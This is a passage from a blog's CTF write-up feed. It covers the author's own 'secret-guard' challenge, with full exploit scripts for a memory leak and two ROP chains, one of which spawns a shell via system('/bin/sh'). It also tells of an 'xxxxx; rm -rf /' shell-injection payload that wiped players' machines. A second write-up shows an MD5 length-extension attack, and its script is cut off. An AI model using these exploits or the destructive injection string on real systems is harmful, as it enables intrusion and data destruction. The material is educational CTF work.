</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;sneak peek&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;here: &#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">line</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">line</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">get_flag_first_half</span><span class="p">():</span>
</span><span class='line'>    <span class="n">tbl</span> <span class="o">=</span> <span class="p">[</span><span class="mi">12</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">10</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">half</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">tbl</span><span class="p">:</span>
</span><span class='line'>        <span class="n">half</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">get_char</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">half</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>仔细分析可以发现，0x401480(sneak_peek) 这个函数是有溢出漏洞的，除了 <code>\r \n</code> 之外，可以覆盖其他任意字符到栈上高位。但是这个函数有 stack canary 保护，因此没法直接利用 return address 来控制 EIP。不过这个 stack frame 内部的变量是可以任意覆盖的，只要变量的地址在 buf 和 canary 之间。进一步分析，可以发现，获取随机种子之后，程序会打印出栈上某个指针所指字符串的一个字母，而这个指针是可以覆盖的。</p>

<p>原始代码如下，也就是下面的 <code>big_secret</code> 是可以覆盖的，于是可以直接把这个变量覆盖成 <code>flag_bss</code>，从而泄漏一个字节。总共 32 次就可以泄漏完整的 flag</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="n">srand</span><span class="p">(</span><span class="n">seed</span><span class="p">);</span>
</span><span class='line'><span class="n">p</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="n">len</span><span class="p">;</span>
</span><span class='line'><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Your piece of secret here: %c</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">big_secret</span><span class="p">[</span><span class="n">p</span><span class="p">]);</span>
</span></code></pre></td></tr></table></div></figure>


<p>第一个漏洞的攻击代码如下：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">flag_bss</span> <span class="o">=</span> <span class="mh">0x402420</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pwn1</span><span class="p">():</span>
</span><span class='line'>    <span class="n">flag</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">index</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">):</span>
</span><span class='line'>        <span class="n">ad</span> <span class="o">=</span> <span class="n">flag_bss</span> <span class="o">+</span> <span class="n">index</span>
</span><span class='line'>        <span class="n">seed</span> <span class="o">=</span> <span class="mi">12</span>
</span><span class='line'>        <span class="k">if</span> <span class="n">ad</span> <span class="o">&amp;</span> <span class="mh">0xff</span> <span class="ow">in</span> <span class="p">(</span><span class="mh">0xd</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">):</span>
</span><span class='line'>            <span class="n">seed</span> <span class="o">=</span> <span class="mi">65</span>
</span><span class='line'>            <span class="n">ad</span> <span class="o">-=</span> <span class="mi">1</span>
</span><span class='line'>        <span class="n">p</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39; &#39;</span> <span class="o">*</span> <span class="mi">14</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">ad</span><span class="p">)</span>
</span><span class='line'>        <span class="n">flag</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">get_char</span><span class="p">(</span><span class="n">p</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>这个漏洞与 openssl heartbleed 漏洞有几分相似，可以泄漏内存中任意地址信息，每次一个 byte，效率略低，但是对于 flag 来说足够了。</p>

<p>这个漏洞的修补并不困难，buffer 读入的时候，检查一下大于 16 就退出循环即可。</p>

<h3>漏洞二 &ndash; 栈溢出漏洞</h3>

<p>在程序问 16 个问题的函数中，存在第二个漏洞，并且是一个裸的 buffer overflow 漏洞。每次回答问题的输入，会被 gets 函数读入，而 gets 是一个非常危险的函数。</p>

<p>这个漏洞比较简单，直接构造 ROP chain 打印 flag 即可。注意 <code>printf</code> 进入之前需要 al 寄存器设置为 0，否则会崩溃，具体原因没有深究，<code>0x400f10</code> 是一个返回值为 0 的函数，可以用来设置 rax 为 0.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># http://github.com/zTrix/zio</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">zio</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pwn2</span><span class="p">():</span>
</span><span class='line'>    <span class="n">io</span> <span class="o">=</span> <span class="n">zio</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">print_write</span> <span class="o">=</span> <span class="n">COLORED</span><span class="p">(</span><span class="n">REPR</span><span class="p">),</span> <span class="n">timeout</span> <span class="o">=</span> <span class="mi">10000</span><span class="p">,</span> <span class="n">write_delay</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;sneak peek&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;s&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;to access:&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;?&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">pop_ret</span> <span class="o">=</span> <span class="mh">0x00401a63</span>
</span><span class='line'>    <span class="n">system</span> <span class="o">=</span> <span class="mh">0x400d70</span>
</span><span class='line'>    <span class="n">printf</span> <span class="o">=</span> <span class="mh">0x400c60</span>
</span><span class='line'>    <span class="n">gets</span> <span class="o">=</span> <span class="mh">0x400da0</span>
</span><span class='line'>    <span class="n">scanf</span> <span class="o">=</span> <span class="mh">0x400d40</span>
</span><span class='line'>    <span class="n">strlen</span> <span class="o">=</span> <span class="mh">0x402258</span>
</span><span class='line'>    <span class="c"># io.gdb_hint()</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;_&#39;</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="s">&#39;AAAA&#39;</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">flag_bss</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="s">&#39;B&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="mh">0x400f10</span><span class="p">)</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">pop_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">flag_bss</span><span class="p">)</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">printf</span><span class="p">)</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">scanf</span><span class="p">))</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">print_read</span> <span class="o">=</span> <span class="n">REPR</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>如果想从这个漏洞拿 shell，就需要泄漏一次地址再跳回程序，利用稍微麻烦一点</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># http://github.com/zTrix/zio</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">zio</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pwn3</span><span class="p">():</span>
</span><span class='line'>    <span class="n">io</span> <span class="o">=</span> <span class="n">zio</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">print_write</span> <span class="o">=</span> <span class="n">COLORED</span><span class="p">(</span><span class="n">REPR</span><span class="p">),</span> <span class="n">timeout</span> <span class="o">=</span> <span class="mi">10000</span><span class="p">,</span> <span class="n">write_delay</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;sneak peek&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;s&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;to access:&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;?&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">pop_ret</span> <span class="o">=</span> <span class="mh">0x00401a63</span>
</span><span class='line'>    <span class="n">system</span> <span class="o">=</span> <span class="mh">0x400d70</span>
</span><span class='line'>    <span class="n">printf</span> <span class="o">=</span> <span class="mh">0x400c60</span>
</span><span class='line'>    <span class="n">gets</span> <span class="o">=</span> <span class="mh">0x400da0</span>
</span><span class='line'>    <span class="n">scanf</span> <span class="o">=</span> <span class="mh">0x400d40</span>
</span><span class='line'>    <span class="n">strlen</span> <span class="o">=</span> <span class="mh">0x402258</span>
</span><span class='line'>    <span class="n">answer</span> <span class="o">=</span> <span class="mh">0x401710</span>
</span><span class='line'>    <span class="n">init</span> <span class="o">=</span> <span class="mh">0x400f10</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;_&#39;</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="s">&#39;AAAA&#39;</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">flag_bss</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="s">&#39;B&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">init</span><span class="p">)</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">pop_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">strlen</span><span class="p">)</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">printf</span><span class="p">)</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">pop_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">flag_bss</span><span class="p">)</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">answer</span><span class="p">))</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">print_read</span> <span class="o">=</span> <span class="n">REPR</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
</span><span class='line'>    <span class="n">addr</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
</span><span class='line'>    <span class="n">strlen_libc</span> <span class="o">=</span> <span class="n">l64</span><span class="p">(</span><span class="n">addr</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span><span class="p">))</span>
</span><span class='line'>    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">strlen_libc</span> <span class="o">-</span> <span class="mh">0x81c40</span>
</span><span class='line'>    <span class="n">binsh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mi">1443474</span>
</span><span class='line'>    <span class="n">log</span><span class="p">(</span><span class="s">&#39;addr = </span><span class="si">%s</span><span class="s">, strlen_libc = </span><span class="si">%x</span><span class="s">, libc_base = </span><span class="si">%x</span><span class="s">, binsh = </span><span class="si">%x</span><span class="s">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">repr</span><span class="p">(</span><span class="n">addr</span><span class="p">),</span> <span class="n">strlen_libc</span><span class="p">,</span> <span class="n">libc_base</span><span class="p">,</span> <span class="n">binsh</span><span class="p">),</span> <span class="s">&#39;red&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
</span><span class='line'>    <span class="c"># io.gdb_hint()</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;_&#39;</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="s">&#39;AAAA&#39;</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">flag_bss</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="s">&#39;B&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">pop_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
</span><span class='line'>    <span class="n">flag</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;cat /home/flags/secret-guard/flag; exit;&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="c"># flag = io.readline()</span>
</span><span class='line'>    <span class="n">flag</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">flag</span>
</span></code></pre></td></tr></table></div></figure>


<p>这个漏洞的修补更加简单，直接把 gets 改成 getchar 即可，但是换行可能会吃掉导致逻辑错误，因此可能需要两个 getchar</p>

<h3>漏洞三 &ndash; 命令注入漏洞</h3>

<p>漏洞三就是比赛队伍一直在利用的 shell injection 漏洞。原理和利用都比较简单，这里就不再赘述了。设计这个漏洞的时候，因为太过简单，就把它放在了程序最后，具有一定的隐蔽性。因此可能造成了不少队伍很晚才发现这个漏洞。</p>

<p>当初设计这个漏洞，同时还有两个目的：</p>

<ul>
<li>纪念 <a href="http://weibo.com/d34dc47">D3AdCa7</a> 童鞋去年 defcon 决赛中，因为写了未加检查的 curl 提交 flag 脚本，因此被别人 flag 中的 <code>xxxxx; rm -rf /</code> 删除了整个系统。好在由于权限原因，重要的个人文件资料并未删除。</li>
<li>提醒大家重视 shell injection，特别是 shell 脚本中，很容易未加检查就信任输入，造成 injection。</li>
</ul>


<p>比较巧合的事情是，<a href="http://weibo.com/d34dc47">D3AdCa7</a>  童鞋的 defcon 遭遇居然在这次决赛中又重演了，而且，就是在这个我设置了 shell injection 漏洞的地方，本意是提醒大家，结果有的队伍直接修改返回为 <code>xxxxx; rm -rf /</code>，我发现这个问题的时候，立刻过去要求他们去掉，恶作剧一下即可，如果真造成损失就不好了，但是没想到当时就已经有其他队伍中招了，并且是不止一个队员。</p>

<p>不知道中招情况如何，但是感觉题目本意想达到的提醒大家注意 shell injection 漏洞的效果被这次意外完成了，无论是中招的童鞋，还是事后谈论的童鞋，应该都会有所防范吧。</p>

<h2>题目总结</h2>

<p>总体来看，虽然是一道不难的题目，但是还是花了不少心思来设计的，有些设计目标达到了，但是也很遗憾没有达到预期结果，特别是前面两个漏洞都没有人利用。</p>

<p>题目中还设置了一些坑点，增加题目趣味性</p>

<ul>
<li>为了防止大家过于容易修改 flag 文件路径，我写了一个山寨 base64 解码得到文件地址。其实和程序逻辑没有什么关系，但是听说有队伍逆向了半天这个 base64，LOL</li>
<li>为了防止大家抓包之后不经分析就直接重放流量，设置了两个障碍

<ol>
<li>各队 flag 各不相同，因此同样的流量，不能回答正确 16 个问题</li>
<li>每次只能获取一个 byte 的信息，因此想回答 16 个问题，至少需要连接 16 次，这样抓包后，攻击流量就会在不同的 TCP stream 中，给分析流量造成一定困难。</li>
</ol>
</li>
<li>另外，ROP chain 的构造中，还有设置 AL 寄存器为 0 的坑，这个不是故意设计的，而是 ABI 方面的坑</li>
</ul>


<p><a href="http://blog.ztrix.me/downloads/secret-guard.7594d1be5c8e9a13c98676c6b516f5ce">题目文件下载</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PlaidCTF 2014 - Parlor (Crypto 250) Writeup]]></title>
    <link href="http://blog.ztrix.me/blog/2014/04/14/plaidctf-2014-parlor-writeup/"/>
    <updated>2014-04-14T21:12:55+08:00</updated>
    <id>http://blog.ztrix.me/blog/2014/04/14/plaidctf-2014-parlor-writeup</id>
    <content type="html"><![CDATA[<p>by Wenlei Zhu (zTrix@blue-lotus)</p>

<p>Problem description</p>

<pre><code>Crypto (250 pts)

The Plague is running a betting service to build up funds for his massive empire. Can you 
figure out a way to beat the house? The service is running at 54.197.195.247:4321.
</code></pre>

<!-- more -->


<p>use nc to connect the service, we got the following screen</p>

<pre><code>/------------------------------------------------------------------------------\
| Welcome to the betting parlor!                                               |
|                                                                              |
| We implement State of the Art cryptography to give you the fairest and most  |
| exciting betting experience!                                                 |
|                                                                              |
| Here's how it works: we both pick a nonce, you tell us odds, and you give us |
| some money.                                                                  |
| If md5(our number + your number) % odds == 0, you win bet amount*odds.       |
| UPDATE: IF YOU DIDN'T REALIZE IT, WE DO INCLUDE A NEWLINE AT THE END OF YOUR |
| NUMBER. SORRY FOR THE INCONVENIENCE. THANK YOU FOR USING PARLOR              |
| Otherwise, we get your money! We're even so nice, we gave you $1000 to start.|
|                                                                              |
| If you don't trust us, we will generate a new nonce, and reveal the old nonce|
| to you, so you can verify all of our results!                                |
|                                                                              |
| (Oh, and if you win a billion dollars, we'll give you a flag.)               |
\______________________________________________________________________________/

====================
  1) set your odds
  2) set your bet
  3) play a round
  4) get balance
  5) reveal nonce
  6) quit
====================
</code></pre>

<p>So, it&rsquo;s a small betting game, if we can win enough money, we&rsquo;ll get a flag.</p>

<p>Studying the rules, we can see that, the smaller the odds, the more likely we can win. If we set odds to <code>1^2</code>, the chance to win will be a half. But we cannot bet the same nonce after winning.</p>

<p>So if we can figure out a way to always win, then we can double our balance each time, reaching a billion won&rsquo;t be a problem any more.</p>

<p>Since the md5 is calculated on <code>server_nonce + player_nonce</code>, and <code>server_nonce</code> won&rsquo;t change until you reveal it, and <code>player_nonce</code> is under our control, so we can easily think of the <a href="http://en.wikipedia.org/wiki/Length_extension_attack">Hash length extension attack</a>.</p>

<p>However, to use <a href="http://en.wikipedia.org/wiki/Length_extension_attack">Hash length extension attack</a>, we need the result of <code>md5(server_nonce + player_nonce)</code>. If we set odds to <code>1^100</code>, then we can get 100 bits of the md5 digest, how about the remaining 28 bits?</p>

<p>Since <code>2^28</code> is not a huge number, we can use brute-force. Here is the attack plan:</p>

<ol>
<li> Set our bet to 1$, odds to <code>2^100</code>, play a round, send &lsquo;a\n&rsquo;</li>
<li> It&rsquo;s mostly likely we will lose, never mind, grab the generated value, which should be sth like <code>0000000171ccbeef0869667267a6bbdd</code> in hex format.</li>
<li> Construct hash length attack padding suffix, play another round, send &lsquo;a\n&rsquo; + suffix + &lsquo;b\n&rsquo;, which would be sth like <code>a\n\x80\x00\x00......\x00\x90\x00\x00\x00\x00\x00\x00\x00b\n</code></li>
<li> And, not surprised, we lose again, never mind, grab the second generated value, which should be sth like <code>0000000f48eabc92e4b180a8d1b7c3d3</code> in hex format.</li>
</ol>


<p>OK, now we know</p>

<ol>
<li> <code>md5(server_nonce + 'a\n') == XXXXXX171ccbeef0869667267a6bbdd</code></li>
<li> <code>md5(server_nonce + 'a\n\x80\x00......\x00\x90\x00\x00\x00\x00\x00\x00\x00b\n' == YYYYYYf48eabc92e4b180a8d1b7c3d3</code></li>
<li> if we know the value of XXXXXXX, we can calculate YYYYYYf48eabc92e4b180a8d1b7c3d3 by hash length extention attack</li>
</ol>


<p>So just brute-force the value of XXXXXXX, and calculate the second md5 value, until we get the same suffix (f48eabc92e4b180a8d1b7c3d3).</p>

<p>After that, use hash extension attack again to search md5 hashes ending with bit 0, which is very easy. Send those winning nonce and get the flag!</p>

<figure class='code'><figcaption><span> (parlor.py)</span> <a href='http://blog.ztrix.me/downloads/code/plaidctf-2014-parlor-writeup/parlor.py'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="c">#!/usr/bin/env python2</span>
</span><span class='line'><span class="c">#-*- coding:utf-8 -*-</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">subprocess</span>
</span><span class='line'>
</span><span class='line'><span class="c"># https://github.com/zTrix/zio</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">zio</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">md5_ext</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">a</span><span class="p">):</span>
</span><span class='line'>    <span class="n">tl</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span>
